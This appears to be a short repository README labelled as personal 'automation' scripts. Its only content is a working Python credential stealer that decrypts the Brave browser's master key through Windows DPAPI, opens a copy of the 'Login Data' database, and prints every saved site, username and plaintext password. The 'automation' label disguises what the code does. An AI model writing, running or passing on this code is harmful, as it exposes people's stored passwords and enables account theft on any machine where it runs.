# automation
basic shit i use for automation and just wanted to open-source them.

```py
import os
import json
import base64
import sqlite3
import shutil
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import win32crypt

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as file:
        local_state = json.loads(file.read())
    encryption_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encryption_key = encryption_key[5:]  # Remove DPAPI prefix
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

def decrypt_password(encrypted_password, key):
    nonce = encrypted_password[3:15]
    ciphertext = encrypted_password[15:-16]
    tag = encrypted_password[-16:]
    cipher = Cipher(
        algorithms.AES(key),
        modes.GCM(nonce, tag),
        backend=default_backend()
    )
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext) + decryptor.finalize()

def main():
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data")
    shutil.copy2(db_path, "Login Data Backup")  # Create a backup of the database
    conn = sqlite3.connect("Login Data Backup")
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    for row in cursor.fetchall():
        url = row[0]
        username = row[1]
        encrypted_password = row[2]
        decrypted_password = decrypt_password(encrypted_password, key)
        print(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password.decode('utf-8')}\n")
    cursor.close()
    conn.close()

if __name__ == "__main__":
    main()
```
